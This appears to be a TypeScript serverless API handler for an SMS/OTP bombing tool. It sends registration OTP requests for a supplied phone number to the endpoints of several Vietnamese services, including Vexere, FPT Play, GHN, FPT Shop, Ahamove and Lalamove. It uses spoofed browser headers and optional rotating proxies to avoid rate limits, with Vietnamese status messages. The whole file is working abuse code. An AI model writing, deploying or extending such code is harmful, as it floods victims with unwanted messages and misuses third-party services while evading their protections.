
import type { VercelRequest, VercelResponse } from '@vercel/node';
import { HttpsProxyAgent } from 'https-proxy-agent';
import fetch from 'node-fetch';

export default async function handler(req: VercelRequest, res: VercelResponse) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { serviceId, phone, proxyConfig } = req.body;
  
  if (!serviceId || !phone) {
    return res.status(400).json({ error: 'Missing parameters' });
  }

  const phoneClean = phone.replace(/\s+/g, '');
  const phoneWith84 = phoneClean.startsWith('0') ? '84' + phoneClean.substring(1) : phoneClean;

  let agent = null;
  if (proxyConfig && proxyConfig.host && proxyConfig.port) {
    const { host, port, user, pass } = proxyConfig;
    // Hỗ trợ cả http và https proxy
    const proxyUrl = user && pass 
      ? `http://${user}:${pass}@${host}:${port}`
      : `http://${host}:${port}`;
    
    try {
      agent = new HttpsProxyAgent(proxyUrl);
    } catch (e) {
      console.error("Agent creation failed");
    }
  }

  try {
    let url = '';
    let bodyData: any = {};
    let headers: any = {
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
      'Accept': 'application/json, text/plain, */*',
      'Content-Type': 'application/json',
      'Origin': 'https://google.com',
      'Referer': 'https://google.com/'
    };

    switch (serviceId) {
      case 'vexere':
        url = 'https://api.vexere.com/v1/user/otp';
        bodyData = { phone: phoneClean, type: 'register' };
        break;
      case 'fptplay':
        url = 'https://api.fptplay.net/api/v7.1_w/user/otp/register_otp';
        bodyData = { phone: phoneClean };
        headers['Origin'] = 'https://fptplay.vn';
        break;
      case 'ghn':
        url = 'https://sso.ghn.vn/v2/otp/send';
        bodyData = { phone: phoneClean };
        break;
      case 'fptshop':
        url = 'https://fptshop.com.vn/api-fsh/customer/get-otp';
        bodyData = { phoneNumber: phoneClean, type: 1 };
        break;
      case 'ahamove':
        url = 'https://app.ahamove.com/api/v1/user/otp';
        bodyData = { mobile: phoneWith84 };
        break;
      case 'lalamove':
        url = 'https://www.lalamove.com/api/v1/otp/send';
        bodyData = { phone: phoneWith84, country: 'VN' };
        break;
      default:
        url = 'https://api.vexere.com/v1/user/otp';
        bodyData = { phone: phoneClean, type: 'register' };
    }

    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 8000); // 8s timeout cho proxy chậm

    const response = await fetch(url, {
      method: 'POST',
      headers: headers,
      body: JSON.stringify(bodyData),
      agent: agent,
      signal: controller.signal as any
    });

    clearTimeout(timeout);
    const status = response.status;
    const resText = await response.text();

    return res.status(200).json({ 
      success: response.ok, 
      status: status,
      proxyUsed: !!agent,
      message: response.ok ? "Yêu cầu đã được gửi" : `Dịch vụ từ chối (${status})`,
      debug: resText.substring(0, 100)
    });

  } catch (error: any) {
    let errMsg = "Lỗi kết nối";
    if (error.name === 'AbortError') errMsg = "Proxy quá chậm (Timeout)";
    else if (error.code === 'ECONNREFUSED') errMsg = "Proxy từ chối kết nối";
    else if (error.code === 'EPROTO') errMsg = "Sai giao thức Proxy";
    
    return res.status(200).json({ 
      success: false, 
      error: error.message,
      message: errMsg
    });
  }
}
